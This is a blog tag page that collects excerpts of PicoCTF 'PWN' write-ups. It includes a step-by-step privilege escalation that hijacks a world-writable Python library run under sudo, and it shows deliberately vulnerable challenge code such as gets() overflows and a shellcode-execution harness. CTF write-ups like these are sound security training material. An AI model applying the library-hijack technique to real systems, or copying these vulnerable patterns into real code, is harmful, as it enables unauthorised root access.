@@ -1,0 +1,683 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/pwn/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PWN"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>PWN | SBK Hugo Site</title>
+<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/pwn/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/pwn/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PWN</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
+<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
+<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
+<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
+<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
+<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
+<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
+<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
+<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
+<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
+<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
+<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
+<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
+<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
+<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
+<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
+<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
+<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---hijacking/>PicoCTF - hijacking</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---hijacking>PicoCTF - hijacking
+<a class=anchor href=#picoctf---hijacking>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>Privilege Escalation</p><p>Hint 1: Check for Hidden files
+Hint 2: No place like Home:)</p><hr><p><a href=https://www.runoob.com/linux/linux-comm-sudo.html>Linux sudo命令</a></p><blockquote><p>-l 顯示出自己（執行 sudo 的使用者）的權限</p></blockquote><h2 id=recon>Recon
+<a class=anchor href=#recon>#</a></h2><p>第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><ol><li>首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library</li><li>現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell</li><li>為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ls -al /usr/lib/python3.8
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>-rwxrwxrwx <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>20382</span> Nov <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2022</span> base64.py
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>38995</span> Nov <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2022</span> os.py
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>35243</span> Nov <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2022</span> socket.py
+</span></span></code></pre></div></li></ol><h2 id=exploit>Exploit
+<a class=anchor href=#exploit>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh picoctf@saturn.picoctf.net -p <span style=color:#ae81ff>58219</span>
+</span></span><span style=display:flex><span>$ find / -name <span style=color:#e6db74>&#34;base64.py&#34;</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>/usr/lib/python3.8/base64.py
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>$ vim /usr/lib/python3.8/base64.py
+</span></span><span style=display:flex><span><span style=color:#75715e># add these line and save the file</span>
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span>os.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ls -al /challenge&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> picoctf on challenge:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User picoctf may run the following commands on challenge:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> /usr/bin/vi
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
+</span></span><span style=display:flex><span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>d--------- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>6</span> Mar <span style=color:#ae81ff>16</span> 02:08 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>51</span> Jul <span style=color:#ae81ff>31</span> 15:23 ..
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>103</span> Mar <span style=color:#ae81ff>16</span> 02:08 metadata.json
+</span></span><span style=display:flex><span>sh: 1: ping: not found
+</span></span><span style=display:flex><span>Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>  File <span style=color:#e6db74>&#34;/home/picoctf/.server.py&#34;</span>, line 7, in &lt;module&gt;
+</span></span><span style=display:flex><span>    host_info <span style=color:#f92672>=</span> socket.gethostbyaddr<span style=color:#f92672>(</span>ip<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>socket.gaierror: <span style=color:#f92672>[</span>Errno -5<span style=color:#f92672>]</span> No address associated with hostname
+</span></span><span style=display:flex><span>$ vim /usr/lib/python3.8/base64.py
+</span></span><span style=display:flex><span><span style=color:#75715e># revise the file</span>
+</span></span><span style=display:flex><span>os.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cat /challegne/metadata.json&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;flag&#34;</span>: <span style=color:#e6db74>&#34;picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&#34;</span>, <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;picoctf&#34;</span>, <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;HYGhWsmPyf&#34;</span><span style=color:#f92672>}</span>sh: 1: ping: not found
+</span></span><span style=display:flex><span>Traceback <span style=color:#f92672>(</span>most recent call last<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>  File <span style=color:#e6db74>&#34;/home/picoctf/.server.py&#34;</span>, line 7, in &lt;module&gt;
+</span></span><span style=display:flex><span>    host_info <span style=color:#f92672>=</span> socket.gethostbyaddr<span style=color:#f92672>(</span>ip<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>socket.gaierror: <span style=color:#f92672>[</span>Errno -5<span style=color:#f92672>]</span> No address associated with hostname
+</span></span></code></pre></div><p>Flag: <code>picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}</code></p><a href=/security/practice/picoctf/pwn/picoctf---hijacking/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---kit-engine/>PicoCTF - Kit Engine</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---kit-engine>PicoCTF - Kit Engine
+<a class=anchor href=#picoctf---kit-engine>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10216397>Google V8 Engine</a></p><blockquote><p>V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。</p></blockquote><p><a href=https://v8.dev/docs/d8>Using d8</a></p><blockquote><p>d8 is V8’s own developer shell.</p><p>d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &ndash;help argument for more information about usage and flags.</p><a href=/security/practice/picoctf/pwn/picoctf---kit-engine/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---ropfu/>PicoCTF - ropfu</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---ropfu>PicoCTF - ropfu
+<a class=anchor href=#picoctf---ropfu>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>ROP Chain
+x86 Calling Convention:
+<a href=https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit>Linux System Call Table</a></p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 16
+
+void vuln() {
+  char buf[16];
+  printf(&#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&#34;);
+  return gets(buf);
+
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+  
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---ropfu/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---rps/>PicoCTF - RPS</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---rps>PicoCTF - RPS
+<a class=anchor href=#picoctf---rps>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://www.geeksforgeeks.org/strstr-in-ccpp/>strstr() in C/C++</a></p><blockquote><p>In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there.
+Syntax:</p><a href=/security/practice/picoctf/pwn/picoctf---rps/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---saas/>PicoCTF - SaaS</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---saas>PicoCTF - SaaS
+<a class=anchor href=#picoctf---saas>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>seccomp-tool</p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;errno.h&gt;
+#include &lt;error.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;unistd.h&gt;
+
+#define SIZE 0x100
+
+// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;arch=x86-64&amp;as_format=inline#assembly
+#define HEADER &#34;\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&#34;
+
+#define FLAG_SIZE 64
+
+char flag[FLAG_SIZE];
+
+void load_flag() {
+  int fd;
+  if ((fd = open(&#34;flag.txt&#34;, O_RDONLY)) == -1)
+    error(EXIT_FAILURE, errno, &#34;open flag&#34;);
+  if (read(fd, flag, FLAG_SIZE) == -1)
+    error(EXIT_FAILURE, errno, &#34;read flag&#34;);
+  if (close(fd) == -1)
+    error(EXIT_FAILURE, errno, &#34;close flag&#34;);
+}
+
+void setup() {
+  scmp_filter_ctx ctx;
+  ctx = seccomp_init(SCMP_ACT_KILL);
+  int ret = 0;
+  if (ctx != NULL) {
+    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1,
+      SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO));
+    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+    ret |= seccomp_load(ctx);
+  }
+  seccomp_release(ctx);
+  if (ctx == NULL || ret)
+    error(EXIT_FAILURE, 0, &#34;seccomp&#34;);
+}
+
+int main()
+{
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  load_flag();
+  puts(&#34;Welcome to Shellcode as a Service!&#34;);
+
+  void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+  memcpy(addr, HEADER, sizeof(HEADER));
+  read(0, addr + sizeof(HEADER) - 1, SIZE);
+
+  setup();
+  goto *addr;
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---saas/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---seed-spring/>PicoCTF - seed-sPRiNG</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---seed-spring>PicoCTF - seed-sPRiNG
+<a class=anchor href=#picoctf---seed-spring>#</a></h1><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA Main Function</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int guess_height; // [esp+0h] [ebp-18h] BYREF
+  int ans; // [esp+4h] [ebp-14h]
+  unsigned int seed; // [esp+8h] [ebp-10h]
+  int i; // [esp+Ch] [ebp-Ch]
+  int *p_argc; // [esp+10h] [ebp-8h]
+
+  p_argc = &amp;argc;
+  puts(&amp;unk_A50);
+  puts(&amp;unk_A50);
+  puts(&#34;                                                                             &#34;);
+  puts(&#34;                          #                mmmmm  mmmmm    \&#34;    mm   m   mmm &#34;);
+  puts(&#34;  mmm    mmm    mmm    mmm#          mmm   #   \&#34;# #   \&#34;# mmm    #\&#34;m  # m\&#34;   \&#34;&#34;);
+  puts(&#34; #   \&#34;  #\&#34;  #  #\&#34;  #  #\&#34; \&#34;#         #   \&#34;  #mmm#\&#34; #mmmm\&#34;   #    # #m # #   mm&#34;);
+  puts(&#34;  \&#34;\&#34;\&#34;m  #\&#34;\&#34;\&#34;\&#34;  #\&#34;\&#34;\&#34;\&#34;  #   #          \&#34;\&#34;\&#34;m  #      #   \&#34;m   #    #  # # #    #&#34;);
+  puts(&#34; \&#34;mmm\&#34;  \&#34;#mm\&#34;  \&#34;#mm\&#34;  \&#34;#m##         \&#34;mmm\&#34;  #      #    \&#34; mm#mm  #   ##  \&#34;mmm\&#34;&#34;);
+  puts(&#34;                                                                             &#34;);
+  puts(&amp;unk_A50);
+  puts(&amp;unk_A50);
+  puts(&#34;Welcome! The game is easy: you jump on a sPRiNG.&#34;);
+  puts(&#34;How high will you fly?&#34;);
+  puts(&amp;unk_A50);
+  fflush(stdout);
+  seed = time(0);
+  srand(seed);
+  for ( i = 1; i &lt;= 30; ++i )
+  {
+    printf(&#34;LEVEL (%d/30)\n&#34;, i);
+    puts(&amp;unk_A50);
+    LOBYTE(ans) = rand() &amp; 0xF;
+    ans = ans;
+    printf(&#34;Guess the height: &#34;);
+    fflush(stdout);
+    __isoc99_scanf(&#34;%d&#34;, &amp;guess_height);
+    fflush(stdin);
+    if ( ans != guess_height )
+    {
+      puts(&#34;WRONG! Sorry, better luck next time!&#34;);
+      fflush(stdout);
+      exit(-1);
+    }
+  }
+  puts(&#34;Congratulation! You&#39;ve won! Here is your flag:\n&#34;);
+  fflush(stdout);
+  get_flag();
+  fflush(stdout);
+  return 0;
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---seed-spring/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---stack-cache/>PicoCTF - stack cache</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---stack-cache>PicoCTF - stack cache
+<a class=anchor href=#picoctf---stack-cache>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>BoF</p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;wchar.h&gt;
+#include &lt;locale.h&gt;
+
+#define BUFSIZE 16
+#define FLAGSIZE 64
+#define INPSIZE 10
+
+/*
+This program is compiled statically with clang-12
+without any optimisations.
+*/
+
+void win() {
+  char buf[FLAGSIZE];
+  char filler[BUFSIZE];
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
+  if (f == NULL) {
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f); // size bound read
+}
+
+void UnderConstruction() {
+        // this function is under construction
+        char consideration[BUFSIZE];
+        char *demographic, *location, *identification, *session, *votes, *dependents;
+	char *p,*q, *r;
+	// *p = &#34;Enter names&#34;;
+	// *q = &#34;Name 1&#34;;
+	// *r = &#34;Name 2&#34;;
+        unsigned long *age;
+	printf(&#34;User information : %p %p %p %p %p %p\n&#34;,demographic, location, identification, session, votes, dependents);
+	printf(&#34;Names of user: %p %p %p\n&#34;, p,q,r);
+        printf(&#34;Age of user: %p\n&#34;,age);
+        fflush(stdout);
+}
+
+void vuln(){
+   char buf[INPSIZE];
+   printf(&#34;Give me a string that gets you the flag\n&#34;);
+   gets(buf);
+   printf(&#34;%s\n&#34;,buf);
+   return;
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+  printf(&#34;Bye!&#34;);
+  return 0;
+}
+</code></pre><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---stack-cache/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---stonk-market/>PicoCTF - Stonk Market</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---stonk-market>PicoCTF - Stonk Market
+<a class=anchor href=#picoctf---stonk-market>#</a></h1><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p>FMT</p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+
+#define FLAG_BUFFER 128
+#define MAX_SYM_LEN 4
